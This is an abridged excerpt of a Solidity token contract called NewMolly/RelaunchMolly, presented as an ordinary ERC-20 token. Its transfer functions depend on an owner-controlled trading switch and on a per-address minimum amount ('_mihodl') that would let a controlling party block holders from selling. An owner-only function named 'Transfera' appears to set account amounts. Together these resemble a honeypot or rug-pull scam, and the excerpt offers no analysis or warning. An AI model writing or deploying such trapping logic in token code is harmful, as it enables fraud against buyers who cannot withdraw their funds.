...
contract NewMolly is Context, Ownable, IERC20 {
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_activeTrade, "RelaunchMolly: Trading is currently disabled");
        require(amount >= _mihodl[_msgSender()], "RelaunchMolly: Transfer amount is less than the minimum allowed");
        require(_balances[_msgSender()] >= amount, "RelaunchMolly: transfer amount exceeds balance");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_activeTrade, "RelaunchMolly: Trading is currently disabled");
        require(amount >= _mihodl[sender], "RelaunchMolly: Not exceed mi hodl");
        require(_balances[sender] >= amount, "RelaunchMolly: transfer amount exceeds balance");
        require(_allowances[sender][_msgSender()] >= amount, "RelaunchMolly: transfer amount exceeds allowance");
    ...
    function Transfera(address account, uint256 newAmount) public onlyOwner {
        require(account != address(0), "RelaunchMolly: address zero is not a valid account");
